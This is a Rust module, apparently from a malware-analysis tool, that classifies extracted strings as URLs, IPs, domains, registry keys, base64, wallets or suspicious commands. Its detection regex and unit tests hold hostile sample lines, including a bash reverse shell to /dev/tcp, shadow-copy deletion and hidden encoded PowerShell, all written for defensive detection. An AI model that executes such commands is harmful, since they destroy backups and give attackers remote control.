//! Pattern-based classification of extracted strings.
//!
//! Patterns are compiled once per process. Kinds whose regex alone is too
//! noisy (IPv4, IPv6, base64) are post-validated in code. Classification is a
//! *fact*, not a finding: it tells the analyst what a string looks like, and
//! later analyzers (IOCs, behavior groups) decide whether it matters.

use std::net::{Ipv4Addr, Ipv6Addr};
use std::sync::LazyLock;

use regex::Regex;

use crate::report::{IocKind, StringKind};

/// Characters trimmed from the end of a URL match (sentence punctuation,
/// closing quotes/brackets around a URL in text).
const TRAILING_PUNCT: &[char] = &['.', ',', ';', ':', '!', '?', ')', ']', '}', '\'', '"'];

/// A byte range of `s` that looks like an IOC.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct IocSpan {
    /// Start byte.
    pub start: usize,
    /// End byte (exclusive).
    pub end: usize,
    /// What it looks like.
    pub kind: IocKind,
}

/// Compiled patterns, or the compile error (a bug, covered by tests).
static CLASSIFIER: LazyLock<Result<Classifier, regex::Error>> = LazyLock::new(Classifier::new);

/// Returns the shared classifier, or the error if a built-in pattern is invalid.
pub fn classifier() -> Result<&'static Classifier, &'static regex::Error> {
    CLASSIFIER.as_ref()
}

/// TLDs accepted for [`StringKind::Domain`]. A whitelist keeps `kernel32.dll`,
/// `setup.exe`, `config.json` etc. out. Matched lowercase only, so .NET-style
/// `System.IO` does not count either.
const TLDS: &str = "com|net|org|info|biz|io|co|me|tv|cc|ws|ru|su|cn|ua|de|uk|fr|nl|br|in|jp|kr|pl|\
                    tk|ml|ga|cf|gq|pw|top|xyz|onion|online|site|club|live";

/// Set of compiled patterns, one per [`StringKind`].
#[derive(Debug)]
pub struct Classifier {
    url: Regex,
    url_full: Regex,
    ipv4: Regex,
    ipv6: Regex,
    domain: Regex,
    email: Regex,
    path: Regex,
    registry: Regex,
    base64: Regex,
    command: Regex,
    wallet: Regex,
    user_agent: Regex,
}

impl Classifier {
    fn new() -> Result<Self, regex::Error> {
        Ok(Self {
            url: Regex::new(r"(?i)\b(?:https?|ftp|wss?)://[a-z0-9\-._~%]+(?::\d{1,5})?")?,
            // Host may be a bracketed IPv6 literal or carry userinfo; the
            // path stops at whitespace, quotes, angle brackets and controls.
            url_full: Regex::new(concat!(
                r"(?i)\b(?:https?|ftp|wss?)://",
                r"(?:[a-z0-9\-._~%!$&'()*+,;=:]*@)?",
                r"(?:\[[0-9a-f:.]+\]|[a-z0-9\-._~%]+)(?::\d{1,5})?",
                r#"(?:[/?#][^\s"'<>\\^`{|}\x00-\x1f\x7f]*)?"#
            ))?,
            ipv4: Regex::new(r"\b\d{1,3}(?:\.\d{1,3}){3}\b")?,
            ipv6: Regex::new(r"(?i)[0-9a-f]{0,4}(?::[0-9a-f]{0,4}){2,7}")?,
            domain: Regex::new(&format!(
                r"\b(?:[a-z0-9](?:[a-z0-9-]{{0,61}}[a-z0-9])?\.)+(?:{TLDS})\b"
            ))?,
            email: Regex::new(r"(?i)\b[a-z0-9._%+-]+@[a-z0-9-]+(?:\.[a-z0-9-]+)*\.[a-z]{2,24}\b")?,
            path: Regex::new(concat!(
                r"(?i)(?:\b[a-z]:\\[^\\\s]|\\\\[a-z0-9_.$-]+\\[^\\\s]|%[a-z_]+%\\",
                r#"|(?:^|[\s'"=])/(?:bin|sbin|etc|tmp|var|usr|dev|proc|home|root|opt|lib|lib64|sys|run)/)"#
            ))?,
            registry: Regex::new(concat!(
                r"(?i)\b(?:HKEY_(?:LOCAL_MACHINE|CURRENT_USER|CLASSES_ROOT|USERS|CURRENT_CONFIG)",
                r"|HKLM|HKCU|HKCR)\b",
                r"|(?i)\b(?:SOFTWARE\\(?:Microsoft|Wow6432Node|Classes|Policies)|SYSTEM\\CurrentControlSet)\\"
            ))?,
            base64: Regex::new(r"^[A-Za-z0-9+/]{20,}={0,2}$")?,
            command: Regex::new(concat!(
                r"(?i)\bcmd(?:\.exe)?\s+/[ck]\s",
                r"|\bpowershell(?:\.exe)?\b.*\s-(?:enc|encodedcommand|e|nop|noprofile|w\s+hidden|windowstyle\s+hidden|ep\s+bypass|executionpolicy\s+bypass)\b",
                r"|\bvssadmin(?:\.exe)?\s+delete\s+shadows",
                r"|\bwmic(?:\.exe)?\b.*shadowcopy\s+delete",
                r"|\bbcdedit(?:\.exe)?\b.*recoveryenabled\s+no",
                r"|\bwbadmin(?:\.exe)?\s+delete\s+catalog",
                r"|\bschtasks(?:\.exe)?\s+/create",
                r"|\breg(?:\.exe)?\s+add\s",
                r"|\bnet(?:\.exe)?\s+user\b.*\s/add",
                r"|\bcertutil(?:\.exe)?\b.*-urlcache",
                r"|\bbitsadmin(?:\.exe)?\b.*/transfer",
                r"|\bregsvr32(?:\.exe)?\b.*/i:",
                r"|\bmshta(?:\.exe)?\s+(?:https?:|javascript:|vbscript:)",
                r"|\b(?:wget|curl)\s.*https?://",
                r"|\bchmod\s+\+x\s",
                r"|/bin/(?:ba)?sh\s+-c\s",
                r"|\bbash\s+-i\s+>&\s*/dev/tcp/",
                r"|\bnc(?:at)?\s+.*-e\s+/bin/"
            ))?,
            wallet: Regex::new(concat!(
                r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b",
                r"|\bbc1[02-9ac-hj-np-z]{39,59}\b",
                r"|\b0x[0-9a-fA-F]{40}\b",
                r"|\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b"
            ))?,
            user_agent: Regex::new(concat!(
                r"\bMozilla/\d\.\d\s*\(",
                r"|(?i)\b(?:curl|wget|python-requests|python-urllib|go-http-client|okhttp|winhttp)/\d"
            ))?,
        })
    }

    /// Returns every kind `s` matches, sorted and deduplicated.
    pub fn classify(&self, s: &str) -> Vec<StringKind> {
        let checks: [(StringKind, bool); 11] = [
            (StringKind::Url, self.url.is_match(s)),
            (StringKind::Ipv4, self.has_ipv4(s)),
            (StringKind::Ipv6, self.has_ipv6(s)),
            (StringKind::Domain, self.domain.is_match(s)),
            (StringKind::Email, self.email.is_match(s)),
            (StringKind::FilePath, self.path.is_match(s)),
            (StringKind::RegistryKey, self.registry.is_match(s)),
            (StringKind::Base64, self.is_base64(s)),
            (StringKind::SuspiciousCommand, self.command.is_match(s)),
            (StringKind::CryptoWallet, self.wallet.is_match(s)),
            (StringKind::UserAgent, self.user_agent.is_match(s)),
        ];
        // Array order is already the enum's Ord order, so the result is sorted.
        checks
            .into_iter()
            .filter_map(|(kind, hit)| hit.then_some(kind))
            .collect()
    }

    /// Non-overlapping IOC-like matches in `s`, by start offset (byte ranges
    /// into `s`). Overlaps resolve by priority URL > email > IPv6 > IPv4 >
    /// domain > wallet, so `user@evil.com` is one email, not also a domain.
    /// URLs include their path; trailing punctuation is trimmed.
    pub fn ioc_spans(&self, s: &str) -> Vec<IocSpan> {
        let mut cands: Vec<IocSpan> = Vec::new();
        let mut push = |start: usize, end: usize, kind: IocKind| {
            cands.push(IocSpan { start, end, kind });
        };
        for m in self.url_full.find_iter(s) {
            let trimmed = m.as_str().trim_end_matches(TRAILING_PUNCT);
            if trimmed.contains("://") && !trimmed.ends_with("://") {
                push(m.start(), m.start() + trimmed.len(), IocKind::Url);
            }
        }
        for m in self.email.find_iter(s) {
            push(m.start(), m.end(), IocKind::Email);
        }
        for m in self.ipv6.find_iter(s) {
            let c = m.as_str();
            let groups = c.split(':').filter(|g| !g.is_empty()).count();
            if groups >= 3 && c.parse::<Ipv6Addr>().is_ok() {
                push(m.start(), m.end(), IocKind::Ipv6);
            }
        }
        if !s.to_ascii_lowercase().contains("version") {
            for m in self.ipv4.find_iter(s) {
                if self.ipv4_standalone(s, m.start(), m.end()) {
                    push(m.start(), m.end(), IocKind::Ipv4);
                }
            }
        }
        for m in self.domain.find_iter(s) {
            push(m.start(), m.end(), IocKind::Domain);
        }
        for m in self.wallet.find_iter(s) {
            push(m.start(), m.end(), IocKind::CryptoWallet);
        }
        // Highest priority first, then leftmost, then longest; accept what
        // does not overlap anything already accepted.
        cands.sort_by_key(|c| (c.kind.priority(), c.start, std::cmp::Reverse(c.end)));
        let mut out: Vec<IocSpan> = Vec::new();
        for c in cands {
            if !out.iter().any(|o| c.start < o.end && o.start < c.end) {
                out.push(c);
            }
        }
        out.sort_by_key(|c| c.start);
        out
    }

    /// See [`Classifier::has_ipv4`]: valid quad, not glued into a longer dotted number.
    fn ipv4_standalone(&self, s: &str, start: usize, end: usize) -> bool {
        let before = s.get(..start).unwrap_or_default();
        let after = s.get(end..).unwrap_or_default();
        let glued_before = before.ends_with('.');
        let glued_after = after
            .strip_prefix('.')
            .is_some_and(|rest| rest.starts_with(|c: char| c.is_ascii_digit()));
        !glued_before
            && !glued_after
            && s.get(start..end)
                .is_some_and(|q| q.parse::<Ipv4Addr>().is_ok())
    }

    /// Valid dotted quad that is not part of a longer dotted number
    /// (`1.2.3.4.5`) and not in a string mentioning "version" (manifests use
    /// `1.0.0.0`-style versions everywhere).
    fn has_ipv4(&self, s: &str) -> bool {
        if s.to_ascii_lowercase().contains("version") {
            return false;
        }
        self.ipv4.find_iter(s).any(|m| {
            let before = s.get(..m.start()).unwrap_or_default();
            let after = s.get(m.end()..).unwrap_or_default();
            let glued_before = before.ends_with('.');
            let glued_after = after
                .strip_prefix('.')
                .is_some_and(|rest| rest.starts_with(|c: char| c.is_ascii_digit()));
            !glued_before && !glued_after && m.as_str().parse::<Ipv4Addr>().is_ok()
        })
    }

    /// Parses as IPv6 and has at least three non-empty groups, which rules out
    /// C++ scope operators (`a::b`) and times (`12:30:45` fails to parse).
    fn has_ipv6(&self, s: &str) -> bool {
        self.ipv6.find_iter(s).any(|m| {
            let candidate = m.as_str();
            let groups = candidate.split(':').filter(|g| !g.is_empty()).count();
            groups >= 3 && candidate.parse::<Ipv6Addr>().is_ok()
        })
    }

    /// Whole string is base64-shaped, length is a multiple of 4, it mixes
    /// upper/lower/digit, and it is not a base64 or alphanumeric lookup table.
    fn is_base64(&self, s: &str) -> bool {
        if !s.len().is_multiple_of(4) || !self.base64.is_match(s) {
            return false;
        }
        let has = |f: fn(&u8) -> bool| s.as_bytes().iter().any(f);
        let mixed =
            has(u8::is_ascii_uppercase) && has(u8::is_ascii_lowercase) && has(u8::is_ascii_digit);
        let is_table = ["ABCDEFGHIJ", "abcdefghij", "0123456789"]
            .iter()
            .any(|run| s.contains(run));
        mixed && !is_table
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use StringKind::*;

    fn kinds(s: &str) -> Vec<StringKind> {
        classifier().unwrap().classify(s)
    }

    fn has(s: &str, k: StringKind) -> bool {
        kinds(s).contains(&k)
    }

    #[test]
    fn all_patterns_compile() {
        assert!(classifier().is_ok());
    }

    #[test]
    fn plain_text_has_no_kinds() {
        assert!(kinds("Hello, this is a normal sentence").is_empty());
        assert!(kinds("GetProcAddress").is_empty());
    }

    #[test]
    fn url() {
        assert!(has("go http://evil.example.com:8080/gate.php", Url));
        assert!(has("HTTPS://x.ru", Url));
        assert!(!has("httpd.conf", Url));
        assert!(!has("http:// nothing", Url));
    }

    #[test]
    fn ipv4() {
        assert!(has("connect 192.168.1.10 now", Ipv4));
        assert!(has("8.8.8.8", Ipv4));
        assert!(!has("999.1.1.1", Ipv4));
        assert!(!has("1.2.3.4.5", Ipv4));
        assert!(!has("v1.2.3.4.5", Ipv4));
        assert!(!has("version=\"1.0.0.0\"", Ipv4));
        assert!(!has("FileVersion 10.0.19041.1", Ipv4));
    }

    #[test]
    fn ipv6() {
        assert!(has("2001:db8::1:2", Ipv6));
        assert!(has("fe80:0:0:0:200:f8ff:fe21:67cf", Ipv6));
        assert!(!has("std::vector::push_back", Ipv6));
        assert!(!has("12:30:45", Ipv6));
        assert!(!has("::1", Ipv6));
    }

    #[test]
    fn domain() {
        assert!(has("update.badsite.ru", Domain));
        assert!(has("www.example.com", Domain));
        assert!(!has("kernel32.dll", Domain));
        assert!(!has("setup.exe", Domain));
        assert!(!has("System.IO", Domain));
    }

    #[test]
    fn email() {
        assert!(has("contact admin@evil-mail.com", Email));
        assert!(!has("user@host", Email));
    }

    #[test]
    fn file_path() {
        assert!(has(r"C:\Users\bob\AppData\x.exe", FilePath));
        assert!(has(r"%APPDATA%\svc.exe", FilePath));
        assert!(has(r"\\server\share\file", FilePath));
        assert!(has("/etc/passwd", FilePath));
        assert!(has("cat /tmp/x", FilePath));
        assert!(!has("a/b/c", FilePath));
        assert!(!has("and/or", FilePath));
    }

    #[test]
    fn registry_key() {
        assert!(has(
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            RegistryKey
        ));
        assert!(has("HKEY_CURRENT_USER", RegistryKey));
        assert!(has(r"HKLM\SYSTEM", RegistryKey));
        assert!(!has("Software engineer", RegistryKey));
    }

    #[test]
    fn base64() {
        assert!(has("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0", Base64));
        assert!(!has(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
            Base64
        ));
        assert!(!has("GetProcAddressGetModuleHandleAbcd", Base64));
        assert!(!has("AAAAAAAAAAAAAAAAAAAAAAAA", Base64));
        assert!(!has("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN", Base64)); // len % 4 != 0
    }

    #[test]
    fn suspicious_command() {
        assert!(has("cmd.exe /c del %temp%\\x", SuspiciousCommand));
        assert!(has(
            "powershell -nop -w hidden -enc SQBFAFgA",
            SuspiciousCommand
        ));
        assert!(has(
            "vssadmin delete shadows /all /quiet",
            SuspiciousCommand
        ));
        assert!(has(
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            SuspiciousCommand
        ));
        assert!(!has("cmd line options", SuspiciousCommand));
        assert!(!has("powershell", SuspiciousCommand));
    }

    #[test]
    fn crypto_wallet() {
        assert!(has("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", CryptoWallet));
        assert!(has(
            "send to 0x52908400098527886E0F7030069857D2E4169EE7",
            CryptoWallet
        ));
        assert!(!has("0x1234", CryptoWallet));
        assert!(!has("12345", CryptoWallet));
    }

    #[test]
    fn user_agent() {
        assert!(has("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", UserAgent));
        assert!(has("python-requests/2.31", UserAgent));
        assert!(!has("Mozilla Public License", UserAgent));
    }

    #[test]
    fn url_also_tags_domain_sorted() {
        assert_eq!(kinds("http://c2.evil.ru/x"), [Url, Domain]);
    }
}
